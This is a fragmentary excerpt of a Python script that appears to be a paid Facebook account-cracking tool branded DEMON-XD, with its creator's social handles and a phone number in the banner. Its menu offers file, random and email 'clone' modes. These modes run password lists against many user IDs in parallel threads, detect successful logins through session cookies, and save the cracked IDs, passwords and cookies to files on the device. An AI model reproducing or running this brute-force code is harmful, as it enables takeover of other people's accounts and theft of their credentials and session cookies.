...
os.system("xdg-open https://m.me/j/Abai_XtXodwibNLC/")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[DEMON-XD')
...
\033[1;91m[+] CREATOR   > Demon Riju


\033[1;91m[+] FACEBOOK  > rm.riju1917


\033[1;91m[+] GITHUB    > DemonVau


\033[1;91m[+] VERSION   > PAID


\033[1;91m[+] WHATSAPP  > +8801948794260
...
def menu():
	...
	_DEMON_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')


	_DEMON_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')


	_DEMON_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')


	_DEMON_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')


	_DEMON_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')


	_____DEMON_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')


	if _____DEMON_____ in ['1']:


		C1()


	if _____DEMON_____ in ['2']:


		Y2()


	if _____DEMON_____ in ['3']:


		BER()


	if _____DEMON_____ in ['4']:


		os.system("xdg-open https://www.facebook.com/rm.riju1917")


	if _____DEMON_____ in ['0']:
...
def passwrd():
	...
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(DEMON_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [DEMON] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\x1b[1;91m [\033[1;91mDEMON-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				...
				print(f'\r\x1b[1;92m [\033[1;92mDEMON-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')


				cek_apk(session,coki)


				open('/sdcard/DEMON-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
...
def Y2():
    ...
    with ThreadPool(max_workers=50) as DEMON:
    ...
    try:
        ...
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    print('\033[1;92m[\033[1;92mDEMON-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    ...
        	    open('/sdcard/DEMON-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        ...
        sys.stdout.write('\r%s[DEMON-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
